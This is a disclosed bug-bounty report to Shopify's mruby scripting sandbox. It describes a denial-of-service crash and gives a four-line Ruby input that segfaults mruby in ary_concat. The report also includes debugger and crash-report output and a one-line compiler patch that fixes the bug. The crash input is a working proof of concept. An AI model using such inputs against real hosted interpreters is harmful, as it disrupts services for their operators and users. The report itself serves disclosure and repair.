ReportLink:https://hackerone.com/reports/187536
WeaknessName:Denial of Service
Reporter:https://hackerone.com/haquaman
ReportedTo:shopify-scripts(shopify-scripts)
BountyAmount:10000.0
Severity:high
State:Closed
DateOfDisclosure:17.12.2016 20:08:23

Summary:

Crash file is:

```
p *case
  when nil
    -0
    nil
end
```

```
$ ./dev/bin/mruby crash.rb
crash.rb:1:3: '*' interpreted as argument prefix
Segmentation fault: 11
```

```
$ lldb ./dev/bin/mruby crash.rb
(lldb) target create "./dev/bin/mruby"
Current executable set to './dev/bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "crash.rb"
(lldb) r
Process 5638 launched: './dev/bin/mruby' (x86_64)
crash.rb:1:3: '*' interpreted as argument prefix
Process 5638 stopped
* thread #1: tid = 0x85b9d00, 0x000000010000278b mruby`ary_concat + 27, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x18)
    frame #0: 0x000000010000278b mruby`ary_concat + 27
mruby`ary_concat:
->  0x10000278b <+27>: movl   0x18(%rdx), %ecx
    0x10000278e <+30>: addl   -0x1c(%rbp), %ecx
    0x100002791 <+33>: movl   %ecx, -0x20(%rbp)
    0x100002794 <+36>: movq   -0x8(%rbp), %rdi
(lldb) bt
* thread #1: tid = 0x85b9d00, 0x000000010000278b mruby`ary_concat + 27, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x18)
  * frame #0: 0x000000010000278b mruby`ary_concat + 27
    frame #1: 0x0000000100002766 mruby`mrb_ary_concat + 70
    frame #2: 0x000000010004451f mruby`mrb_vm_exec + 25439
    frame #3: 0x000000010003e1a7 mruby`mrb_vm_run + 135
    frame #4: 0x0000000100046604 mruby`mrb_top_run + 100
    frame #5: 0x0000000100071adf mruby`load_exec + 1183
    frame #6: 0x0000000100071623 mruby`mrb_load_file_cxt + 67
    frame #7: 0x00000001000017d8 mruby`main + 904
    frame #8: 0x00007fff8a9db5ad libdyld.dylib`start + 1
(lldb) register read
General Purpose Registers:
       rax = 0x000000010100f030
       rbx = 0x0000000000000000
       rcx = 0x0000000000000000
       rdx = 0x0000000000000000
       rdi = 0x0000000100300390
       rsi = 0x0000000000000000
       rbp = 0x00007fff5fbfca00
       rsp = 0x00007fff5fbfc9e0
        r8 = 0x0000000000000000
        r9 = 0x000000000000010e
       r10 = 0x0000000000000002
       r11 = 0x0000000000f83160
       r12 = 0x0000000000000000
       r13 = 0x0000000000000000
       r14 = 0x0000000000000000
       r15 = 0x0000000000000000
       rip = 0x000000010000278b  mruby`ary_concat + 27
    rflags = 0x0000000000010202
        cs = 0x000000000000002b
        fs = 0x0000000000000000
        gs = 0x0000000000000000

(lldb) q
Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y

```

```
$ ./bin/sandbox crash.rb
./bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000018
ruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]

-- Crash Report log information --------------------------------------------
   See Crash Report log file under the one of following:
     * ~/Library/Logs/CrashReporter
     * /Library/Logs/CrashReporter
     * ~/Library/Logs/DiagnosticReports
     * /Library/Logs/DiagnosticReports
   for more details.
Don't forget to include the above Crash Report log file in bug reports.

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0011 e:000010 CFUNC  :sandbox_eval
c:0002 p:0214 s:0006 E:001c70 EVAL   ./bin/sandbox:20 [FINISH]
c:0001 p:0000 s:0002 E:001b60 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
./bin/sandbox:20:in `<main>'
./bin/sandbox:20:in `sandbox_eval'

-- Machine register context ------------------------------------------------
 rax: 0x0000000104c7c120 rbx: 0x0000000104cd3c28 rcx: 0x0000000000000003
 rdx: 0x0000000104c7c120 rdi: 0x0000000104c74440 rsi: 0x0000000000000000
 rbp: 0x00007fff5b9daf50 rsp: 0x00007fff5b9daf20  r8: 0x0000000000000000
  r9: 0x0000000104c75d60 r10: 0x0000000104c86a88 r11: 0x0000000000000020
 r12: 0x0000000104c74460 r13: 0x0000000000000000 r14: 0x0000000000000000
 r15: 0x0000000000000000 rip: 0x0000000104b4e97d rfl: 0x0000000000010206

-- C level backtrace information -------------------------------------------
0   ruby                                0x00000001043c15d4 rb_vm_bugreport + 388
1   ruby                                0x0000000104263023 rb_bug_context + 483
2   ruby                                0x0000000104336653 sigsegv + 83
3   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26
4   mruby_engine.bundle                 0x0000000104b4e97d mrb_ary_concat + 29
5   ???                                 0x0000000104c74440 0x0 + 4375135296

-- Other runtime information -----------------------------------------------

* Loaded script: ./bin/sandbox

* Loaded features:

    0 enumerator.so
    1 thread.rb
    2 rational.so
    3 complex.so
<snip various gems>
  185 /Users/<snip>/mruby-engine/lib/mruby_engine/mruby_engine.bundle
  186 /Users/<snip>/mruby-engine/lib/mruby_engine.rb

[NOTE]
You may have encountered a bug in the Ruby interpreter or extension libraries.
Bug reports are welcome.
For details: http://www.ruby-lang.org/bugreport.html

Abort trap: 6

```

Patch to fix is:

```
diff --git a/mrbgems/mruby-compiler/core/codegen.c b/mrbgems/mruby-compiler/core/codegen.c
index 553baa1..5ddf988 100644
--- a/mrbgems/mruby-compiler/core/codegen.c
+++ b/mrbgems/mruby-compiler/core/codegen.c
@@ -2256,7 +2256,7 @@ codegen(codegen_scope *s, node *tree, int val)
             }
             genop(s, co);
           }
-          push();
+          if (val) push();
         }
         break;
 
```

Hope that helps!

Cheers,

Hugh